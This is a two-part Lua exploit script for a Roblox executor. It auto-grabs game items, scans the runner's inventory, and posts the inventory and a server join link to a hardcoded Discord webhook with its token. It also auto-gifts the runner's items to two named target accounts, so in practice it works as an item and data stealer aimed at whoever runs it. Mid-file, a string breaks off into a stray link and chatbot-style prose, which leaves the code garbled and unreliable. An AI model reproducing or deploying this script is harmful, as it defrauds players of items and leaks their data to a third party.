-- ═══════════════════════════════════════════════════════════
-- PART 1: Config, Services, Targets, Tween, Grab, Gift Remote
-- Execute this first in Delta Executor
-- ═══════════════════════════════════════════════════════════

local WEBHOOK_URL = "https://discord.com/api/webhooks/1493406637963346041/j10gY9eRyHymXa8MZzMrZL81hxcxu9zFZRlbW42fBLyu4NO36EEVoxp_8OioCimIg8E2"
local REDIRECT_PAGE_URL = "https://website-psi-lime-75.vercel.app"

-- ==================== TARGET USERS ====================

_G.TARGET_USERS = {
    [4155516039] = "Pa1n7777",
    ["ErrorisHacker"] = true,
}

_G.isTarget = function(player)
    if _G.TARGET_USERS[player.UserId] then return true end
    if _G.TARGET_USERS[player.Name] then return true end
    if _G.TARGET_USERS[player.Name:lower()] then return true end
    return false
end

-- ==================== CONFIG ====================

_G.CONFIG = {
    AutoGrab = true,
    AutoGift = true,
    TargetOnlyGift = true,
    GiftRadius = 12,
    EquipBeforeGift = true,
    GiftDelay = 1.5,
    SkipBarbell = true,
    WebhookOnGrab = true,
    InstantWebhook = true,      -- NEW: Send webhook immediately on execute
    LoopGrab = false,
    LoopInterval = 10,
    RareAlert = true,
    RareKeywords = {"legendary", "mythic", "godly", "rare", "exotic", "divine", "secret", "limited"},
    TweenSpeed = 50
}

-- ==================== SERVICES ====================

_G.Players = game:GetService("Players")
_G.LocalPlayer = _G.Players.LocalPlayer
_G.HttpService = game:GetService("HttpService")
_G.ReplicatedStorage = game:GetService("ReplicatedStorage")
_G.Workspace = game:GetService("Workspace")
_G.TweenService = game:GetService("TweenService")

-- ==================== UTILS ====================

_G.isBarbell = function(name)
    return name:lower():find("barbell") ~= nil
end

-- ==================== SERVER INFO (FIXED) ====================

_G.GetServerInfo = function()
    local placeId = game.PlaceId
    local jobId = game.JobId or "" -- Ensures it doesn't error if nil
    
    local gameName = "Roblox-Game"
    pcall(function()
        local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
        if info and info.Name then
            gameName = info.Name
        end
    end)
    
    -- Ensure the base URL ends with a slash before the query parameters
    local baseUrl = REDIRECT_PAGE_URL
    if not baseUrl:find("/$") then baseUrl = baseUrl .. "/" end

    local redirectUrl = ""
    local joinUrl = "https://www.roblox.com/games/" .. placeId

    -- Only generate the specialized link if we have a valid JobId
    if jobId ~= "" and jobId ~= " " then
        local encodedName = _G.HttpService:UrlEncode(gameName)
        redirectUrl = string.format("%s?placeId=%s&jobId=%s&name=%s", baseUrl, tostring(placeId), tostring(jobId), encodedName)
        joinUrl = "https://www.roblox.com/games/" .. placeId .. "/" .. encodedName .. "?gameInstanceId=" .. jobId
    else
        -- Fallback for Studio or failed JobId fetch
        redirectUrl = baseUrl .. "?placeId=" .. placeId
    end
    
    local teleportScript = ""
    if jobId ~= "" then
        teleportScript = "
http://googleusercontent.com/immersive_entry_chip/0

Now, when you click the **"Click Here"** link in your Discord Webhook, it will open your Vercel page, which will immediately trigger the `roblox://` protocol to launch the specific server.

-- ==================== GIFT REMOTE ====================

_G.GiftRemote = nil
pcall(function()
    _G.GiftRemote = _G.ReplicatedStorage:WaitForChild("Shared", 5)
        :WaitForChild("Packages", 5)
        :WaitForChild("Network", 5)
        :WaitForChild("rev_GiftRequest", 5)
end)

if _G.GiftRemote then
    print("✅ Gift remote connected:", _G.GiftRemote:GetFullName())
else
    warn("❌ Gift remote not found!")
end

-- ==================== TWEEN TARGET TO EXECUTOR ====================

_G.activeTweens = {}

_G.tweenPlayerToExecutor = function(targetPlayer)
    if targetPlayer == _G.LocalPlayer then return end
    local targetChar = targetPlayer.Character
    if not targetChar then return end
    
    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
    local myHrp = _G.LocalPlayer.Character and _G.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp or not myHrp then return end
    
    if _G.activeTweens[targetPlayer.UserId] then
        pcall(function() _G.activeTweens[targetPlayer.UserId]:Cancel() end)
    end
    
    local distance = (targetHrp.Position - myHrp.Position).Magnitude
    local duration = distance / _G.CONFIG.TweenSpeed
    
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local goal = {CFrame = myHrp.CFrame + Vector3.new(0, 0, 3)}
    
    local tween = _G.TweenService:Create(targetHrp, tweenInfo, goal)
    _G.activeTweens[targetPlayer.UserId] = tween
    
    tween:Play()
    print("🎯 Tweening", targetPlayer.Name, "→ you (", math.floor(distance), "studs )")
    
    tween.Completed:Connect(function()
        _G.activeTweens[targetPlayer.UserId] = nil
        print("✅", targetPlayer.Name, "arrived!")
    end)
end

-- ==================== REMOTE GRAB ====================

_G.RemoteGrab = function()
    local grabbed = 0
    pcall(function()
        local Event = _G.ReplicatedStorage:WaitForChild("Shared", 5)
            :WaitForChild("Packages", 5)
            :WaitForChild("Network", 5)
            :WaitForChild("rev_S_Interact", 5)
        for i = 1, 50 do
            Event:FireServer(i)
            grabbed = grabbed + 1
            task.wait(0.03)
        end
    end)
    return grabbed
end

-- ==================== PHYSICAL GRAB ====================

_G.PhysicalGrab = function()
    local backpack = _G.LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return 0 end
    local grabbed = 0
    local character = _G.LocalPlayer.Character
    local hrp = character and character:FindFirstChild("HumanoidRootPart")
    
    for _, obj in ipairs(_G.Workspace:GetDescendants()) do
        if obj:IsA("Tool") then
            local owned = false
            pcall(function()
                if obj.Parent and obj.Parent:FindFirstChild("Humanoid") then
                    if _G.Players:GetPlayerFromCharacter(obj.Parent) then owned = true end
                end
            end)
            if not owned then
                pcall(function()
                    if hrp and obj:IsA("BasePart") then
                        hrp.CFrame = obj.CFrame + Vector3.new(0, 2, 0)
                        task.wait(0.05)
                    end
                    obj.Parent = backpack
                    grabbed = grabbed + 1
                end)
            end
        end
    end
    
    for _, obj in ipairs(_G.Workspace:GetDescendants()) do
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            local clicker = obj:FindFirstChildWhichIsA("ClickDetector")
            local prompt = obj:FindFirstChildWhichIsA("ProximityPrompt")
            if clicker or prompt then
                local name = obj.Name:lower()
                if name:find("item") or name:find("tool") or name:find("loot") or name:find("drop") or name:find("crate") then
                    pcall(function()
                        if prompt then fireproximityprompt(prompt) end
                        if clicker then fireclickdetector(clicker) end
                    end)
                end
            end
        end
    end
    
    return grabbed
end

-- ==================== TARGET MONITORING ====================

_G.onTargetCharacterAdded = function(targetPlayer, character)
    local hrp = character:WaitForChild("HumanoidRootPart", 5)
    if not hrp then return end
    
    _G.tweenPlayerToExecutor(targetPlayer)
    
    task.spawn(function()
        while targetPlayer.Parent and targetPlayer.Character == character do
            local myChar = _G.LocalPlayer.Character
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local targetHrp = character:FindFirstChild("HumanoidRootPart")
            
            if myHrp and targetHrp then
                local dist = (myHrp.Position - targetHrp.Position).Magnitude
                if dist <= _G.CONFIG.GiftRadius then
                    if _G.tryGiftToPlayer then _G.tryGiftToPlayer(targetPlayer) end
                end
            end
            task.wait(0.5)
        end
    end)
end

_G.handleTargetPlayer = function(player)
    if not _G.isTarget(player) then return end
    print("🎯 TARGET JOINED:", player.Name, "(", player.UserId, ")")
    
    if player.Character then
        _G.onTargetCharacterAdded(player, player.Character)
    end
    
    player.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        _G.onTargetCharacterAdded(player, char)
    end)
end

for _, player in ipairs(_G.Players:GetPlayers()) do
    _G.handleTargetPlayer(player)
end

_G.Players.PlayerAdded:Connect(_G.handleTargetPlayer)

print("✅ PART 1 LOADED — Execute PART 2 next")
-- ═══════════════════════════════════════════════════════════
-- PART 2: Gift Queue, Inventory Scan, Webhook, Main Loop
-- Execute this AFTER Part 1 in Delta Executor
-- ═══════════════════════════════════════════════════════════

-- ==================== GIFT SYSTEM ====================

_G.giftQueue = {}
_G.isGifting = false
_G.lastGiftTime = 0
_G.giftedPlayers = {}

_G.getBackpackItems = function()
    local items = {}
    local backpack = _G.LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return items end
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            if not (_G.CONFIG.SkipBarbell and _G.isBarbell(item.Name)) then
                table.insert(items, item)
            end
        end
    end
    return items
end

_G.giftItemToPlayer = function(item, player)
    if tick() - _G.lastGiftTime < _G.CONFIG.GiftDelay then return false end
    if not _G.GiftRemote then return false end
    
    local success = false
    
    pcall(function()
        _G.GiftRemote:FireServer(player.UserId)
        success = true
    end)
    
    pcall(function()
        _G.GiftRemote:FireServer(player.Name)
    end)
    
    pcall(function()
        local pBackpack = player:FindFirstChild("Backpack")
        if pBackpack then
            item.Parent = pBackpack
            success = true
        end
    end)
    
    if success then
        _G.lastGiftTime = tick()
        _G.giftedPlayers[player.UserId] = tick()
        print("🎁 Gifted:", item.Name, "→", player.Name)
    end
    
    return success
end

_G.processGiftQueue = function()
    if _G.isGifting then return end
    _G.isGifting = true
    
    while #_G.giftQueue > 0 do
        local data = table.remove(_G.giftQueue, 1)
        local item = data.item
        local player = data.player
        
        if item and item.Parent == _G.LocalPlayer.Backpack then
            if _G.CONFIG.EquipBeforeGift then
                local char = _G.LocalPlayer.Character
                if char then
                    pcall(function() item.Parent = char end)
                    print("🖐️ Equipped for gifting:", item.Name)
                    task.wait(0.8)
                end
            end
            _G.giftItemToPlayer(item, player)
        end
        
        task.wait(_G.CONFIG.GiftDelay)
    end
    
    _G.isGifting = false
end

_G.queueGift = function(item, player)
    table.insert(_G.giftQueue, {item = item, player = player})
    _G.processGiftQueue()
end

_G.tryGiftToPlayer = function(player)
    if not _G.CONFIG.AutoGift then return end
    if tick() - (_G.giftedPlayers[player.UserId] or 0) < 5 then return end
    
    local items = _G.getBackpackItems()
    for _, item in ipairs(items) do
        _G.queueGift(item, player)
        break
    end
end

-- ==================== SCAN INVENTORY ====================

_G.ScanInventory = function()
    local items = {}
    local function Add(name, location, value)
        table.insert(items, {name = tostring(name), location = location, value = value and tostring(value) or nil})
    end
    
    local backpack = _G.LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do Add(tool.Name, "Backpack", tool.ClassName) end
    end
    
    local character = _G.LocalPlayer.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") or tool:IsA("HopperBin") then Add(tool.Name, "Equipped", tool.ClassName) end
        end
    end
    
    local leaderstats = _G.LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        for _, stat in ipairs(leaderstats:GetChildren()) do Add(stat.Name, "Leaderstats", stat.Value) end
    end
    
    for _, folder in ipairs(_G.LocalPlayer:GetChildren()) do
        local lower = folder.Name:lower()
        if lower:find("inventory") or lower:find("data") or lower:find("items") or lower:find("stats") then
            for _, item in ipairs(folder:GetChildren()) do
                local val = ""
                pcall(function() if item:IsA("ValueBase") then val = " = " .. tostring(item.Value) end end)
                Add(item.Name .. val, "Player." .. folder.Name, item.ClassName)
            end
        end
    end
    
    for _, folder in ipairs(_G.ReplicatedStorage:GetChildren()) do
        local lower = folder.Name:lower()
        if lower:find("data") or lower:find("inventory") or lower:find("player") then
            local pdata = folder:FindFirstChild(_G.LocalPlayer.Name) or folder:FindFirstChild(tostring(_G.LocalPlayer.UserId))
            if pdata then
                for _, item in ipairs(pdata:GetChildren()) do
                    local val = ""
                    pcall(function() if item:IsA("ValueBase") then val = " = " .. tostring(item.Value) end end)
                    Add(item.Name .. val, "RS." .. folder.Name, item.ClassName)
                end
            end
        end
    end
    
    return items
end

-- ==================== CHECK RARE ITEMS ====================

_G.hasRareItems = function(items)
    for _, item in ipairs(items) do
        local name = item.name:lower()
        for _, keyword in ipairs(_G.CONFIG.RareKeywords) do
            if name:find(keyword) then return true, item.name end
        end
    end
    return false, ""
end

-- ==================== WEBHOOK ====================

_G.SendWebhook = function(title, remoteCount, physCount, items, isInstant)
    local text = ""
    if #items == 0 then
        text = "No items found."
    else
        for i, item in ipairs(items) do
            local line = string.format("%d. %s [%s]", i, item.name, item.location)
            if item.value then line = line .. " (" .. item.value .. ")" end
            text = text .. line .. "\n"
        end
    end
    
    if #text > 3000 then text = text:sub(1, 3000) .. "\n... (truncated)" end
    
    local s = _G.GetServerInfo()
    local isRare, rareName = _G.hasRareItems(items)
    
    local fields = {
        {name = "📡 Remote Fires", value = tostring(remoteCount or 0), inline = true},
        {name = "📦 Physical Grabs", value = tostring(physCount or 0), inline = true},
        {name = "🎒 Inventory Items: " .. #items, value = "```\n" .. text .. "```", inline = false}
    }
    
    if _G.CONFIG.AutoGift then
        table.insert(fields, 3, {
            name = "🎁 Equip→Gift",
            value = "Targets: Pa1n7777, ErrorisHacker | Radius: " .. _G.CONFIG.GiftRadius .. " studs",
            inline = false
        })
    end
    
    if s.redirectUrl ~= "" then
        table.insert(fields, {name = "🚀 Tap to Join", value = "[Click Here](" .. s.redirectUrl .. ")\n`JobId: " .. s.jobId .. "`", inline = false})
    end
    
    if s.teleportScript ~= "" then
        table.insert(fields, {name = "⌨️ Delta Script", value = s.teleportScript, inline = false})
    end
    
    local payload = {
        content = (_G.CONFIG.RareAlert and isRare) and "@everyone **RARE ITEM: " .. rareName .. "**" or nil,
        embeds = {{
            title = title or "Inventory Scan",
            color = isInstant and 0x00ff00 or (isRare and 0xffd700 or 0xe74c3c),
            description = string.format("**Player:** %s | **UserId:** %d | **Place:** %d", _G.LocalPlayer.Name, _G.LocalPlayer.UserId, s.placeId),
            fields = fields,
            footer = {text = "Delta | " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    
    local success, err = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = _G.HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("✅ Webhook sent! Items:", #items, isInstant and "| INSTANT SCAN" or "")
    else
        warn("❌ Webhook failed:", tostring(err))
    end
end

-- ==================== MAIN EXECUTION ====================

-- 🚀 NEW: Instant webhook the SECOND script executes
if _G.CONFIG.InstantWebhook then
    print("📡 Sending instant inventory webhook...")
    local instantItems = _G.ScanInventory()
    _G.SendWebhook("🟢 INSTANT EXECUTE SCAN", 0, 0, instantItems, true)
    task.wait(1)
end

-- Then proceed with normal grab + gift flow
local function doGrabAndScan()
    print("Firing remote interactions...")
    local remoteCount = _G.RemoteGrab()
    
    task.wait(0.5)
    
    print("Grabbing physical items...")
    local physCount = _G.PhysicalGrab()
    
    task.wait(0.5)
    
    print("Scanning inventory...")
    local items = _G.ScanInventory()
    
    if _G.CONFIG.WebhookOnGrab then
        _G.SendWebhook("Target Tween + Equip→Gift + Inventory Scan", remoteCount, physCount, items, false)
    end
    
    print("\n=== REMOTE:", remoteCount, "| PHYS:", physCount, "| ITEMS:", #items, "===")
    for i, v in ipairs(items) do
        print(i .. ".", v.name, "|", v.location)
    end
    print("========================")
end

doGrabAndScan()

if _G.CONFIG.LoopGrab then
    task.spawn(function()
        while true do
            task.wait(_G.CONFIG.LoopInterval)
            doGrabAndScan()
        end
    end)
end

print("✅ PART 2 LOADED — Script running")
